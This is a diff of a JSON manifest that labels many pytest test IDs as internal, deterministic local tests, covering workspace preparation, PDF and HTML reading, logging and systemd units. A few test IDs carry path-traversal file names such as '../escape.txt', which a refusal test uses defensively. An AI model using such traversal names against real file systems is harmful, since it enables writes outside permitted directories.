+      "marker": null,
+      "external_resources": []
+    },
+    {
+      "nodeid": "tests/unit/preparation/test_raspa.py::test_unit_cells_that_are_not_three_counts_are_refused",
+      "classification": "internal",
+      "reason": "deterministic local test",
+      "marker": null,
+      "external_resources": []
+    },
+    {
+      "nodeid": "tests/unit/preparation/test_registry.py::test_a_contract_naming_two_environments_is_refused",
+      "classification": "internal",
+      "reason": "deterministic local test",
+      "marker": null,
+      "external_resources": []
+    },
+    {
+      "nodeid": "tests/unit/preparation/test_registry.py::test_a_contract_reaches_the_materializer_named_for_it",
+      "classification": "internal",
+      "reason": "deterministic local test",
+      "marker": null,
+      "external_resources": []
+    },
+    {
+      "nodeid": "tests/unit/preparation/test_registry.py::test_a_contract_with_no_environment_is_not_prepared",
+      "classification": "internal",
+      "reason": "deterministic local test",
+      "marker": null,
+      "external_resources": []
+    },
+    {
+      "nodeid": "tests/unit/preparation/test_registry.py::test_a_deployment_with_no_materializers_says_so",
+      "classification": "internal",
+      "reason": "deterministic local test",
+      "marker": null,
+      "external_resources": []
+    },
+    {
+      "nodeid": "tests/unit/preparation/test_registry.py::test_a_materializer_is_found_by_the_environment_it_names",
+      "classification": "internal",
+      "reason": "deterministic local test",
+      "marker": null,
+      "external_resources": []
+    },
+    {
+      "nodeid": "tests/unit/preparation/test_registry.py::test_an_unknown_environment_names_the_ones_that_exist",
+      "classification": "internal",
+      "reason": "deterministic local test",
+      "marker": null,
+      "external_resources": []
+    },
+    {
+      "nodeid": "tests/unit/preparation/test_registry.py::test_one_environment_is_built_by_one_materializer",
+      "classification": "internal",
+      "reason": "deterministic local test",
+      "marker": null,
+      "external_resources": []
+    },
+    {
+      "nodeid": "tests/unit/preparation/test_registry.py::test_the_environments_are_named_the_way_a_refusal_names_them",
+      "classification": "internal",
+      "reason": "deterministic local test",
+      "marker": null,
+      "external_resources": []
+    },
+    {
+      "nodeid": "tests/unit/preparation/test_registry.py::test_the_kind_is_part_of_the_key",
+      "classification": "internal",
+      "reason": "deterministic local test",
+      "marker": null,
+      "external_resources": []
+    },
+    {
+      "nodeid": "tests/unit/preparation/test_workspace.py::test_a_materializer_puts_what_is_its_own_beside_what_every_manifest_has",
+      "classification": "internal",
+      "reason": "deterministic local test",
+      "marker": null,
+      "external_resources": []
+    },
+    {
+      "nodeid": "tests/unit/preparation/test_workspace.py::test_a_name_that_is_not_a_file_name_is_refused[../escape.txt]",
+      "classification": "internal",
+      "reason": "deterministic local test",
+      "marker": null,
+      "external_resources": []
+    },
+    {
+      "nodeid": "tests/unit/preparation/test_workspace.py::test_a_name_that_is_not_a_file_name_is_refused[..]",
+      "classification": "internal",
+      "reason": "deterministic local test",
+      "marker": null,
+      "external_resources": []
+    },
+    {
+      "nodeid": "tests/unit/preparation/test_workspace.py::test_a_name_that_is_not_a_file_name_is_refused[]",
+      "classification": "internal",
+      "reason": "deterministic local test",
+      "marker": null,
+      "external_resources": []
+    },
+    {
+      "nodeid": "tests/unit/preparation/test_workspace.py::test_a_name_that_is_not_a_file_name_is_refused[back\\\\slash.txt]",
+      "classification": "internal",
+      "reason": "deterministic local test",
+      "marker": null,
+      "external_resources": []
+    },
+    {
+      "nodeid": "tests/unit/preparation/test_workspace.py::test_a_name_that_is_not_a_file_name_is_refused[sub/dir.txt]",
+      "classification": "internal",
+      "reason": "deterministic local test",
+      "marker": null,
+      "external_resources": []
+    },
+    {
+      "nodeid": "tests/unit/preparation/test_workspace.py::test_a_prepared_execution_carries_checks_and_metadata",
+      "classification": "internal",
+      "reason": "deterministic local test",
+      "marker": null,
+      "external_resources": []
+    },
+    {
+      "nodeid": "tests/unit/preparation/test_workspace.py::test_a_refusal_carries_the_class_that_routes_it",
+      "classification": "internal",
+      "reason": "deterministic local test",
+      "marker": null,
+      "external_resources": []
+    },
+    {
+      "nodeid": "tests/unit/preparation/test_workspace.py::test_a_refusal_must_be_one_of_the_known_classes",
+      "classification": "internal",
+      "reason": "deterministic local test",
+      "marker": null,
+      "external_resources": []
+    },
+    {
+      "nodeid": "tests/unit/preparation/test_workspace.py::test_a_refusal_must_say_why",
+      "classification": "internal",
+      "reason": "deterministic local test",
+      "marker": null,
+      "external_resources": []
+    },
+    {
+      "nodeid": "tests/unit/preparation/test_workspace.py::test_a_symlink_where_a_file_belongs_cannot_send_the_write_elsewhere",
+      "classification": "internal",
+      "reason": "deterministic local test",
+      "marker": null,
+      "external_resources": []
+    },
+    {
+      "nodeid": "tests/unit/preparation/test_workspace.py::test_a_written_file_is_named_by_its_content",
+      "classification": "internal",
+      "reason": "deterministic local test",
+      "marker": null,
+      "external_resources": []
+    },
+    {
+      "nodeid": "tests/unit/preparation/test_workspace.py::test_json_is_written_the_same_way_every_time",
+      "classification": "internal",
+      "reason": "deterministic local test",
+      "marker": null,
+      "external_resources": []
+    },
+    {
+      "nodeid": "tests/unit/preparation/test_workspace.py::test_the_manifest_does_not_list_itself",
+      "classification": "internal",
+      "reason": "deterministic local test",
+      "marker": null,
+      "external_resources": []
+    },
+    {
+      "nodeid": "tests/unit/preparation/test_workspace.py::test_the_manifest_names_the_contract_the_files_were_built_from",
+      "classification": "internal",
+      "reason": "deterministic local test",
+      "marker": null,
+      "external_resources": []
+    },
+    {
+      "nodeid": "tests/unit/preparation/test_workspace.py::test_the_workspace_lists_what_it_wrote_in_order",
+      "classification": "internal",
+      "reason": "deterministic local test",
+      "marker": null,
+      "external_resources": []
+    },
+    {
       "nodeid": "tests/unit/state/test_schema.py::test_a_records_fields_are_exactly_its_tables_columns[AcceptanceContractRepository]",
       "classification": "internal",
       "reason": "deterministic local test",
@@ -9412,7 +13477,21 @@
       "external_resources": []
     },
     {
+      "nodeid": "tests/unit/state/test_schema.py::test_a_records_fields_are_exactly_its_tables_columns[LabHandoverRepository]",
+      "classification": "internal",
+      "reason": "deterministic local test",
+      "marker": null,
+      "external_resources": []
+    },
+    {
       "nodeid": "tests/unit/state/test_schema.py::test_a_records_fields_are_exactly_its_tables_columns[MembershipRepository]",
+      "classification": "internal",
+      "reason": "deterministic local test",
+      "marker": null,
+      "external_resources": []
+    },
+    {
+      "nodeid": "tests/unit/state/test_schema.py::test_a_records_fields_are_exactly_its_tables_columns[PreparationRepository]",
       "classification": "internal",
       "reason": "deterministic local test",
       "marker": null,
@@ -9441,6 +13520,13 @@
     },
     {
       "nodeid": "tests/unit/state/test_schema.py::test_a_records_fields_are_exactly_its_tables_columns[RoadmapRepository]",
+      "classification": "internal",
+      "reason": "deterministic local test",
+      "marker": null,
+      "external_resources": []
+    },
+    {
+      "nodeid": "tests/unit/state/test_schema.py::test_a_records_fields_are_exactly_its_tables_columns[RunReconciliationRepository]",
       "classification": "internal",
       "reason": "deterministic local test",
       "marker": null,
@@ -9573,7 +13659,21 @@
       "external_resources": []
     },
     {
+      "nodeid": "tests/unit/state/test_schema.py::test_every_repository_can_order_what_it_returns[LabHandoverRepository]",
+      "classification": "internal",
+      "reason": "deterministic local test",
+      "marker": null,
+      "external_resources": []
+    },
+    {
       "nodeid": "tests/unit/state/test_schema.py::test_every_repository_can_order_what_it_returns[MembershipRepository]",
+      "classification": "internal",
+      "reason": "deterministic local test",
+      "marker": null,
+      "external_resources": []
+    },
+    {
+      "nodeid": "tests/unit/state/test_schema.py::test_every_repository_can_order_what_it_returns[PreparationRepository]",
       "classification": "internal",
       "reason": "deterministic local test",
       "marker": null,
@@ -9602,6 +13702,13 @@
     },
     {
       "nodeid": "tests/unit/state/test_schema.py::test_every_repository_can_order_what_it_returns[RoadmapRepository]",
+      "classification": "internal",
+      "reason": "deterministic local test",
+      "marker": null,
+      "external_resources": []
+    },
+    {
+      "nodeid": "tests/unit/state/test_schema.py::test_every_repository_can_order_what_it_returns[RunReconciliationRepository]",
       "classification": "internal",
       "reason": "deterministic local test",
       "marker": null,
@@ -9734,7 +13841,21 @@
       "external_resources": []
     },
     {
+      "nodeid": "tests/unit/state/test_schema.py::test_every_scoped_record_carries_the_project_it_belongs_to[LabHandoverRepository]",
+      "classification": "internal",
+      "reason": "deterministic local test",
+      "marker": null,
+      "external_resources": []
+    },
+    {
       "nodeid": "tests/unit/state/test_schema.py::test_every_scoped_record_carries_the_project_it_belongs_to[MembershipRepository]",
+      "classification": "internal",
+      "reason": "deterministic local test",
+      "marker": null,
+      "external_resources": []
+    },
+    {
+      "nodeid": "tests/unit/state/test_schema.py::test_every_scoped_record_carries_the_project_it_belongs_to[PreparationRepository]",
       "classification": "internal",
       "reason": "deterministic local test",
       "marker": null,
@@ -9763,6 +13884,13 @@
     },
     {
       "nodeid": "tests/unit/state/test_schema.py::test_every_scoped_record_carries_the_project_it_belongs_to[RoadmapRepository]",
+      "classification": "internal",
+      "reason": "deterministic local test",
+      "marker": null,
+      "external_resources": []
+    },
+    {
+      "nodeid": "tests/unit/state/test_schema.py::test_every_scoped_record_carries_the_project_it_belongs_to[RunReconciliationRepository]",
       "classification": "internal",
       "reason": "deterministic local test",
       "marker": null,
@@ -10267,6 +14395,398 @@
     },
     {
       "nodeid": "tests/unit/test_composition.py::test_written_overlay_is_parseable_yaml",
+      "classification": "internal",
+      "reason": "deterministic local test",
+      "marker": null,
+      "external_resources": []
+    },
+    {
+      "nodeid": "tests/unit/test_deepread.py::test_a_count_stops_being_exact_when_it_stops_counting",
+      "classification": "internal",
+      "reason": "deterministic local test",
+      "marker": null,
+      "external_resources": []
+    },
+    {
+      "nodeid": "tests/unit/test_deepread.py::test_a_document_larger_than_the_cap_is_cut_and_says_so",
+      "classification": "internal",
+      "reason": "deterministic local test",
+      "marker": null,
+      "external_resources": []
+    },
+    {
+      "nodeid": "tests/unit/test_deepread.py::test_a_file_that_is_not_a_pdf_is_reported_rather_than_raised",
+      "classification": "internal",
+      "reason": "deterministic local test",
+      "marker": null,
+      "external_resources": []
+    },
+    {
+      "nodeid": "tests/unit/test_deepread.py::test_a_format_with_no_words_says_so_instead_of_returning_nothing",
+      "classification": "internal",
+      "reason": "deterministic local test",
+      "marker": null,
+      "external_resources": []
+    },
+    {
+      "nodeid": "tests/unit/test_deepread.py::test_a_match_inside_its_own_repetition_is_one_match",
+      "classification": "internal",
+      "reason": "deterministic local test",
+      "marker": null,
+      "external_resources": []
+    },
+    {
+      "nodeid": "tests/unit/test_deepread.py::test_a_page_range_is_read_in_the_forms_it_documents[ 2 , 3 -expected4]",
+      "classification": "internal",
+      "reason": "deterministic local test",
+      "marker": null,
+      "external_resources": []
+    },
+    {
+      "nodeid": "tests/unit/test_deepread.py::test_a_page_range_is_read_in_the_forms_it_documents[1,4-5-expected3]",
+      "classification": "internal",
+      "reason": "deterministic local test",
+      "marker": null,
+      "external_resources": []
+    },
+    {
+      "nodeid": "tests/unit/test_deepread.py::test_a_page_range_is_read_in_the_forms_it_documents[1,4-expected2]",
+      "classification": "internal",
+      "reason": "deterministic local test",
+      "marker": null,
+      "external_resources": []
+    },
+    {
+      "nodeid": "tests/unit/test_deepread.py::test_a_page_range_is_read_in_the_forms_it_documents[3-5-expected1]",
+      "classification": "internal",
+      "reason": "deterministic local test",
+      "marker": null,
+      "external_resources": []
+    },
+    {
+      "nodeid": "tests/unit/test_deepread.py::test_a_page_range_is_read_in_the_forms_it_documents[3-expected0]",
+      "classification": "internal",
+      "reason": "deterministic local test",
+      "marker": null,
+      "external_resources": []
+    },
+    {
+      "nodeid": "tests/unit/test_deepread.py::test_a_page_range_that_cannot_be_read_is_refused[,,-10-names no page]",
+      "classification": "internal",
+      "reason": "deterministic local test",
+      "marker": null,
+      "external_resources": []
+    },
+    {
+      "nodeid": "tests/unit/test_deepread.py::test_a_page_range_that_cannot_be_read_is_refused[0-10-pages are numbered from 1]",
+      "classification": "internal",
+      "reason": "deterministic local test",
+      "marker": null,
+      "external_resources": []
+    },
+    {
+      "nodeid": "tests/unit/test_deepread.py::test_a_page_range_that_cannot_be_read_is_refused[1-6-10-at most 5]",
+      "classification": "internal",
+      "reason": "deterministic local test",
+      "marker": null,
+      "external_resources": []
+    },
+    {
+      "nodeid": "tests/unit/test_deepread.py::test_a_page_range_that_cannot_be_read_is_refused[11-10-asks for page 11]",
+      "classification": "internal",
+      "reason": "deterministic local test",
+      "marker": null,
+      "external_resources": []
+    },
+    {
+      "nodeid": "tests/unit/test_deepread.py::test_a_page_range_that_cannot_be_read_is_refused[5-3-10-runs upwards]",
+      "classification": "internal",
+      "reason": "deterministic local test",
+      "marker": null,
+      "external_resources": []
+    },
+    {
+      "nodeid": "tests/unit/test_deepread.py::test_a_page_range_that_cannot_be_read_is_refused[one-10-not a page range]",
+      "classification": "internal",
+      "reason": "deterministic local test",
+      "marker": null,
+      "external_resources": []
+    },
+    {
+      "nodeid": "tests/unit/test_deepread.py::test_a_pdf_a_server_calls_html_is_read_as_a_pdf_anyway",
+      "classification": "internal",
+      "reason": "deterministic local test",
+      "marker": null,
+      "external_resources": []
+    },
+    {
+      "nodeid": "tests/unit/test_deepread.py::test_a_pdf_is_read_as_a_pdf_when_the_server_does_not_say_it_is_one",
+      "classification": "internal",
+      "reason": "deterministic local test",
+      "marker": null,
+      "external_resources": []
+    },
+    {
+      "nodeid": "tests/unit/test_deepread.py::test_a_pdf_is_read_page_by_page",
+      "classification": "internal",
+      "reason": "deterministic local test",
+      "marker": null,
+      "external_resources": []
+    },
+    {
+      "nodeid": "tests/unit/test_deepread.py::test_a_pdf_with_no_text_layer_reports_a_scan_rather_than_empty_pages",
+      "classification": "internal",
+      "reason": "deterministic local test",
+      "marker": null,
+      "external_resources": []
+    },
+    {
+      "nodeid": "tests/unit/test_deepread.py::test_a_read_never_names_more_pages_than_the_cap",
+      "classification": "internal",
+      "reason": "deterministic local test",
+      "marker": null,
+      "external_resources": []
+    },
+    {
+      "nodeid": "tests/unit/test_deepread.py::test_a_scan_with_a_text_cover_page_is_not_called_a_scan",
+      "classification": "internal",
+      "reason": "deterministic local test",
+      "marker": null,
+      "external_resources": []
+    },
+    {
+      "nodeid": "tests/unit/test_deepread.py::test_a_search_counts_past_the_matches_it_shows",
+      "classification": "internal",
+      "reason": "deterministic local test",
+      "marker": null,
+      "external_resources": []
+    },
+    {
+      "nodeid": "tests/unit/test_deepread.py::test_a_search_is_literal_and_case_insensitive",
+      "classification": "internal",
+      "reason": "deterministic local test",
+      "marker": null,
+      "external_resources": []
+    },
+    {
+      "nodeid": "tests/unit/test_deepread.py::test_a_search_that_spans_a_line_break_finds_nothing",
+      "classification": "internal",
+      "reason": "deterministic local test",
+      "marker": null,
+      "external_resources": []
+    },
+    {
+      "nodeid": "tests/unit/test_deepread.py::test_a_window_is_clamped_to_the_text_rather_than_refused",
+      "classification": "internal",
+      "reason": "deterministic local test",
+      "marker": null,
+      "external_resources": []
+    },
+    {
+      "nodeid": "tests/unit/test_deepread.py::test_an_encrypted_pdf_is_reported_rather_than_opened",
+      "classification": "internal",
+      "reason": "deterministic local test",
+      "marker": null,
+      "external_resources": []
+    },
+    {
+      "nodeid": "tests/unit/test_deepread.py::test_an_offset_a_search_reports_is_an_offset_a_read_can_use",
+      "classification": "internal",
+      "reason": "deterministic local test",
+      "marker": null,
+      "external_resources": []
+    },
+    {
+      "nodeid": "tests/unit/test_deepread.py::test_asking_whether_a_pdf_has_text_samples_rather_than_reads_it_all",
+      "classification": "internal",
+      "reason": "deterministic local test",
+      "marker": null,
+      "external_resources": []
+    },
+    {
+      "nodeid": "tests/unit/test_deepread.py::test_each_media_type_is_read_as_itself[-other]",
+      "classification": "internal",
+      "reason": "deterministic local test",
+      "marker": null,
+      "external_resources": []
+    },
+    {
+      "nodeid": "tests/unit/test_deepread.py::test_each_media_type_is_read_as_itself[None-other]",
+      "classification": "internal",
+      "reason": "deterministic local test",
+      "marker": null,
+      "external_resources": []
+    },
+    {
+      "nodeid": "tests/unit/test_deepread.py::test_each_media_type_is_read_as_itself[application/atom+xml-xml]",
+      "classification": "internal",
+      "reason": "deterministic local test",
+      "marker": null,
+      "external_resources": []
+    },
+    {
+      "nodeid": "tests/unit/test_deepread.py::test_each_media_type_is_read_as_itself[application/json-json]",
+      "classification": "internal",
+      "reason": "deterministic local test",
+      "marker": null,
+      "external_resources": []
+    },
+    {
+      "nodeid": "tests/unit/test_deepread.py::test_each_media_type_is_read_as_itself[application/pdf-pdf]",
+      "classification": "internal",
+      "reason": "deterministic local test",
+      "marker": null,
+      "external_resources": []
+    },
+    {
+      "nodeid": "tests/unit/test_deepread.py::test_each_media_type_is_read_as_itself[application/vnd.api+json-json]",
+      "classification": "internal",
+      "reason": "deterministic local test",
+      "marker": null,
+      "external_resources": []
+    },
+    {
+      "nodeid": "tests/unit/test_deepread.py::test_each_media_type_is_read_as_itself[application/xhtml+xml-html]",
+      "classification": "internal",
+      "reason": "deterministic local test",
+      "marker": null,
+      "external_resources": []
+    },
+    {
+      "nodeid": "tests/unit/test_deepread.py::test_each_media_type_is_read_as_itself[application/xml-xml]",
+      "classification": "internal",
+      "reason": "deterministic local test",
+      "marker": null,
+      "external_resources": []
+    },
+    {
+      "nodeid": "tests/unit/test_deepread.py::test_each_media_type_is_read_as_itself[application/zip-other]",
+      "classification": "internal",
+      "reason": "deterministic local test",
+      "marker": null,
+      "external_resources": []
+    },
+    {
+      "nodeid": "tests/unit/test_deepread.py::test_each_media_type_is_read_as_itself[image/png-other]",
+      "classification": "internal",
+      "reason": "deterministic local test",
+      "marker": null,
+      "external_resources": []
+    },
+    {
+      "nodeid": "tests/unit/test_deepread.py::test_each_media_type_is_read_as_itself[text/csv-text]",
+      "classification": "internal",
+      "reason": "deterministic local test",
+      "marker": null,
+      "external_resources": []
+    },
+    {
+      "nodeid": "tests/unit/test_deepread.py::test_each_media_type_is_read_as_itself[text/html-html]",
+      "classification": "internal",
+      "reason": "deterministic local test",
+      "marker": null,
+      "external_resources": []
+    },
+    {
+      "nodeid": "tests/unit/test_deepread.py::test_each_media_type_is_read_as_itself[text/html; charset=utf-8-html]",
+      "classification": "internal",
+      "reason": "deterministic local test",
+      "marker": null,
+      "external_resources": []
+    },
+    {
+      "nodeid": "tests/unit/test_deepread.py::test_each_media_type_is_read_as_itself[text/plain-text]",
+      "classification": "internal",
+      "reason": "deterministic local test",
+      "marker": null,
+      "external_resources": []
+    },
+    {
+      "nodeid": "tests/unit/test_deepread.py::test_each_media_type_is_read_as_itself[text/x-bibtex-text]",
+      "classification": "internal",
+      "reason": "deterministic local test",
+      "marker": null,
+      "external_resources": []
+    },
+    {
+      "nodeid": "tests/unit/test_deepread.py::test_each_media_type_is_read_as_itself[text/xml-xml]",
+      "classification": "internal",
+      "reason": "deterministic local test",
+      "marker": null,
+      "external_resources": []
+    },
+    {
+      "nodeid": "tests/unit/test_deepread.py::test_folding_that_would_move_an_offset_falls_back_to_the_characters",
+      "classification": "internal",
+      "reason": "deterministic local test",
+      "marker": null,
+      "external_resources": []
+    },
+    {
+      "nodeid": "tests/unit/test_deepread.py::test_html_is_read_as_the_words_and_says_what_was_removed",
+      "classification": "internal",
+      "reason": "deterministic local test",
+      "marker": null,
+      "external_resources": []
+    },
+    {
+      "nodeid": "tests/unit/test_deepread.py::test_json_is_reindented_and_the_values_are_unchanged",
+      "classification": "internal",
+      "reason": "deterministic local test",
+      "marker": null,
+      "external_resources": []
+    },
+    {
+      "nodeid": "tests/unit/test_deepread.py::test_json_that_does_not_parse_is_shown_as_it_arrived",
+      "classification": "internal",
+      "reason": "deterministic local test",
+      "marker": null,
+      "external_resources": []
+    },
+    {
+      "nodeid": "tests/unit/test_deepread.py::test_naming_no_pages_reads_the_first_ones",
+      "classification": "internal",
+      "reason": "deterministic local test",
+      "marker": null,
+      "external_resources": []
+    },
+    {
+      "nodeid": "tests/unit/test_deepread.py::test_only_the_pages_asked_for_are_extracted",
+      "classification": "internal",
+      "reason": "deterministic local test",
+      "marker": null,
+      "external_resources": []
+    },
+    {
+      "nodeid": "tests/unit/test_deepread.py::test_plain_text_is_not_touched",
+      "classification": "internal",
+      "reason": "deterministic local test",
+      "marker": null,
+      "external_resources": []
+    },
+    {
+      "nodeid": "tests/unit/test_deepread.py::test_text_that_is_not_utf8_says_which_bytes_were_replaced",
+      "classification": "internal",
+      "reason": "deterministic local test",
+      "marker": null,
+      "external_resources": []
+    },
+    {
+      "nodeid": "tests/unit/test_deepread.py::test_the_context_around_a_match_collapses_whitespace",
+      "classification": "internal",
+      "reason": "deterministic local test",
+      "marker": null,
+      "external_resources": []
+    },
+    {
+      "nodeid": "tests/unit/test_deepread.py::test_the_excerpt_is_the_beginning_of_what_a_read_returns",
+      "classification": "internal",
+      "reason": "deterministic local test",
+      "marker": null,
+      "external_resources": []
+    },
+    {
+      "nodeid": "tests/unit/test_deepread.py::test_xml_is_read_as_its_text_nodes",
       "classification": "internal",
       "reason": "deterministic local test",
       "marker": null,
@@ -12297,6 +16817,132 @@
     },
     {
       "nodeid": "tests/unit/test_scope.py::test_scope_requires_a_project",
+      "classification": "internal",
+      "reason": "deterministic local test",
+      "marker": null,
+      "external_resources": []
+    },
+    {
+      "nodeid": "tests/unit/test_service_logs.py::test_a_field_a_call_site_added_is_a_key_beside_the_reserved_ones",
+      "classification": "internal",
+      "reason": "deterministic local test",
+      "marker": null,
+      "external_resources": []
+    },
+    {
+      "nodeid": "tests/unit/test_service_logs.py::test_a_json_line_carries_the_keys_a_collector_queries_on",
+      "classification": "internal",
+      "reason": "deterministic local test",
+      "marker": null,
+      "external_resources": []
+    },
+    {
+      "nodeid": "tests/unit/test_service_logs.py::test_a_traceback_stays_inside_the_record_it_belongs_to",
+      "classification": "internal",
+      "reason": "deterministic local test",
+      "marker": null,
+      "external_resources": []
+    },
+    {
+      "nodeid": "tests/unit/test_service_logs.py::test_an_unknown_log_format_is_refused_rather_than_read_as_text",
+      "classification": "internal",
+      "reason": "deterministic local test",
+      "marker": null,
+      "external_resources": []
+    },
+    {
+      "nodeid": "tests/unit/test_service_logs.py::test_the_filter_marks_every_record_that_passes_through_it",
+      "classification": "internal",
+      "reason": "deterministic local test",
+      "marker": null,
+      "external_resources": []
+    },
+    {
+      "nodeid": "tests/unit/test_service_logs.py::test_the_json_formatter_leaves_the_logging_machinery_out_of_the_line",
+      "classification": "internal",
+      "reason": "deterministic local test",
+      "marker": null,
+      "external_resources": []
+    },
+    {
+      "nodeid": "tests/unit/test_service_logs.py::test_the_text_shape_names_the_process_and_its_pid",
+      "classification": "internal",
+      "reason": "deterministic local test",
+      "marker": null,
+      "external_resources": []
+    },
+    {
+      "nodeid": "tests/unit/test_service_units.py::test_a_unit_comes_back_from_anything_but_a_deliberate_stop",
+      "classification": "internal",
+      "reason": "deterministic local test",
+      "marker": null,
+      "external_resources": []
+    },
+    {
+      "nodeid": "tests/unit/test_service_units.py::test_a_unit_is_asked_to_stop_in_a_way_the_application_can_hear",
+      "classification": "internal",
+      "reason": "deterministic local test",
+      "marker": null,
+      "external_resources": []
+    },
+    {
+      "nodeid": "tests/unit/test_service_units.py::test_a_unit_runs_the_checkout_as_a_named_account",
+      "classification": "internal",
+      "reason": "deterministic local test",
+      "marker": null,
+      "external_resources": []
+    },
+    {
+      "nodeid": "tests/unit/test_service_units.py::test_a_unit_starts_the_runner_that_belongs_to_it",
+      "classification": "internal",
+      "reason": "deterministic local test",
+      "marker": null,
+      "external_resources": []
+    },
+    {
+      "nodeid": "tests/unit/test_service_units.py::test_every_unit_names_an_entry_point_that_exists",
+      "classification": "internal",
+      "reason": "deterministic local test",
+      "marker": null,
+      "external_resources": []
+    },
+    {
+      "nodeid": "tests/unit/test_service_units.py::test_no_credential_is_on_a_command_line",
+      "classification": "internal",
+      "reason": "deterministic local test",
+      "marker": null,
+      "external_resources": []
+    },
+    {
+      "nodeid": "tests/unit/test_service_units.py::test_systemd_accepts_the_units_a_default_install_would_write",
+      "classification": "internal",
+      "reason": "deterministic local test",
+      "marker": null,
+      "external_resources": []
+    },
+    {
+      "nodeid": "tests/unit/test_service_units.py::test_systemd_understands_the_units_as_they_are_checked_in",
+      "classification": "internal",
+      "reason": "deterministic local test",
+      "marker": null,
+      "external_resources": []
+    },
+    {
+      "nodeid": "tests/unit/test_service_units.py::test_the_dry_run_reader_would_notice_a_unit_it_could_not_read",
+      "classification": "internal",
+      "reason": "deterministic local test",
+      "marker": null,
+      "external_resources": []
+    },
+    {
+      "nodeid": "tests/unit/test_service_units.py::test_the_installer_changes_the_prefix_and_the_account_and_nothing_else",
+      "classification": "internal",
+      "reason": "deterministic local test",
+      "marker": null,
+      "external_resources": []
+    },
+    {
+      "nodeid": "tests/unit/test_service_units.py::test_there_is_one_unit_per_service_and_the_names_match",
       "classification": "internal",
       "reason": "deterministic local test",
       "marker": null,
